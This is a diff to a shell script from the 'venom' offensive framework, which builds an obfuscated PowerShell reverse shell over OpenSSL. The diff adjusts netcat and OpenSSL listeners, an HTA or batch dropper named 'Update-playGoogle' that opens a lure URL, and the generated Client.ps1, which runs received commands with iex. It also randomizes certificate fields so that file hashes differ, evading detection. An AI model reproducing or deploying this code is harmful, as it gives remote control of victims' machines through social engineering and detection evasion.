@@ -12648,7 +12648,7 @@ echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
 read odf
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 ## START HANDLER
-xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
+xterm -T " NETCAT LISTENER => $lhost:$lport" -geometry 110x23 -e "sudo nc -lvvp $lport"
 sleep 2
 
 
@@ -12874,7 +12874,7 @@ read odf
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 ## START HANDLER
 cd $IPATH/output
-xterm -T " OPENSSL LISTENER - $lhost:$lport" -geometry 110x23 -e "echo OpenSSL:[$CN]:[key.pem][cert.pem];echo Listening on [any] $lport ..;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
+xterm -T " OPENSSL LISTENER => $lhost:$lport" -geometry 110x23 -e "echo OpenSSL:[$CN]:[key.pem][cert.pem];echo Listening on [any] $lport ..;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
 dtr=$(date|awk {'print $1,$2,$3,$4'})
 cd $IPATH
 sleep 2
@@ -13106,7 +13106,7 @@ read odf
 rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 ## START NETCAT HANDLER ON SELLECTED PORT NUMBER
 cd $IPATH/output
-xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
+xterm -T " NETCAT LISTENER => $lhost:$lport" -geometry 110x23 -e "sudo nc -lvvp $lport"
 dtr=$(date|awk {'print $1,$2,$3,$4'})
 cd $IPATH
 sleep 2
@@ -13595,7 +13595,7 @@ read stupidpause
 
 ## START SERVER HANDLER ON SELLECTED IP/PORT NUMBER
 cd $IPATH/output
-xterm -T "SERVER LISTENER - $lhost:$lport" -geometry 120x23 -e "wine Server.exe ip=$lhost port=$lport"
+xterm -T "SERVER LISTENER => $lhost:$lport" -geometry 120x23 -e "wine Server.exe ip=$lhost port=$lport"
 cd $IPATH
 sleep 1
 
@@ -13664,7 +13664,7 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 443" --entry --wid
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-playGoogle\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 CN=$(zenity --title="☠ Enter OpenSSL CN (domain name) ☠" --text "example: SSARedTeam.com\nWarning: CN must be a valid Domain Name." --entry --width 300) > /dev/null 2>&1
 if [ "$easter_egg" = "ON" ]; then
-   SE=$(zenity --title="☠ Social Engineering URL ☠" --text "Enter social engineering url to open.\nExample: https://play.google.com/store" --entry --width 300) > /dev/null 2>&1
+   SE=$(zenity --title="☠ Social Engineering ☠" --text "'The URL to open before Agent execution'.\nLeave the input field blank to use default URL.\n\nDefault URL: https://play.google.com/store" --entry --width 300) > /dev/null 2>&1
 fi
 
 ## Setting default values in case user have skip this ..
@@ -13673,7 +13673,7 @@ if [ -z "$lport" ]; then lport="443";fi
 if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
 if [ -z "$Drop" ]; then Drop="Update-playGoogle";fi
 if [ -z "$SE" ]; then SE="https://play.google.com/store";fi
-if [ "$easter_egg" = "OFF" ]; then Ext="bat";else Ext="hta";fi
+if [ "$easter_egg" = "ON" ]; then Ext="hta";else Ext="bat";fi
 
 
 ## Display final settings to user.
@@ -13706,6 +13706,7 @@ if [ "$easter_egg" = "ON" ]; then
    echo "window.close();" >> $IPATH/output/$Drop.$Ext
    echo "</script>" >> $IPATH/output/$Drop.$Ext
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Dropper.hta html file written to output.";sleep 1
+   if [ "$easter_egg" = "ON" ]; then echo "${BlueF}[${YellowF}i${BlueF}]${white} SE URL:${YellowF} $SE";fi
 else
    echo ":: Author: r00t-3xp10it (SSA RedTeam @2020)" > $IPATH/output/$Drop.$Ext
    echo ":: Framework: Venom v1.0.17 - shinigami" >> $IPATH/output/$Drop.$Ext
@@ -13726,7 +13727,7 @@ echo "Obfuscated Reverse OpenSSL Shell" >> $IPATH/output/Client.ps1
 echo "Framework: venom v1.0.17 - shinigami" >> $IPATH/output/Client.ps1
 echo "#>" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
-echo "Start-Sleep -Seconds 1" >> $IPATH/output/Client.ps1
+echo "Start-Sleep -Milliseconds 700" >> $IPATH/output/Client.ps1
 echo "\$Waudt = \"tneilCpcT.stekcoS.teN\";\$Bin = \$Waudt.ToCharArray();[Array]::Reverse(\$Bin);" >> $IPATH/output/Client.ps1
 echo "\$NewObjectCommand = (\$Bin -Join '');\$Microphone = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$Microphone.ToCharArray();" >> $IPATH/output/Client.ps1
 echo "[Array]::Reverse(\$CharArray);\$PSArgException = (\$CharArray -Join '');" >> $IPATH/output/Client.ps1
@@ -13740,7 +13741,7 @@ echo "        \$writer.Write((pwd).Path + '> ')" >> $IPATH/output/Client.ps1
 echo "        \$writer.flush()" >> $IPATH/output/Client.ps1
 echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
-echo "Start-Sleep -Seconds 1" >> $IPATH/output/Client.ps1
+echo "Start-Sleep -Milliseconds 500" >> $IPATH/output/Client.ps1
 echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/Client.ps1
 echo "   \$data = (New-Object -TypeName \$PSArgException).GetString(\$bytes,0, \$i);" >> $IPATH/output/Client.ps1
 echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/Client.ps1
@@ -13756,7 +13757,18 @@ cd $IPATH/output
 rm $IPATH/output/cert.pem > /dev/nul 2>&1
 rm $IPATH/output/key.pem > /dev/nul 2>&1
 echo "${BlueF}[☠]${white} Building SSL certificates (openssl)"${Reset};sleep 2
-xterm -T " Building SSL certificates " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj \"/C=PT/ST=Estremadura/L=Lisbon/O=Global Security/OU=IT Department/CN=$CN\""
+
+## Ramdomly chose the openssl settings (to make diferent SHA)
+conv=$(cat /dev/urandom | tr -dc '1-3' | fold -w 1 | head -n 1)
+if [ "$conv" = "1" ]; then
+   days="245";contry="US";localidade="Boston"
+elif [ "$conv" = "2" ]; then
+   days="365";contry="PT";localidade="Lisbon"
+else 
+   days="105";contry="FR";localidade="Paris"
+fi
+
+xterm -T " Building SSL certificates " -geometry 110x23 -e "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days $days -nodes -subj \"/C=$contry/ST=Estremadura/L=$localidade/O=Global Security/OU=IT Department/CN=$CN\""
 echo "${BlueF}[${YellowF}i${BlueF}]${white} venom/output/key.pem + cert.pem ([${GreenF}OK${white}])";sleep 2
 cd $IPATH
 
@@ -13801,7 +13813,7 @@ echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
 read odf
 rm $IPATH/output/Client.ps1 > /dev/nul 2>&1
 ## START NETCAT HANDLER ON SELLECTED PORT NUMBER
-xterm -T " OPENSSL LISTENER - $lhost:$lport" -geometry 110x23 -e "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
+xterm -T " OPENSSL LISTENER => $lhost:$lport" -geometry 110x23 -e "echo Domain-Name : $CN;echo Certficates : key.pem + cert.pem;echo Listening on: $lhost:$lport;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $lport"
 cd $IPATH
 sleep 2
 
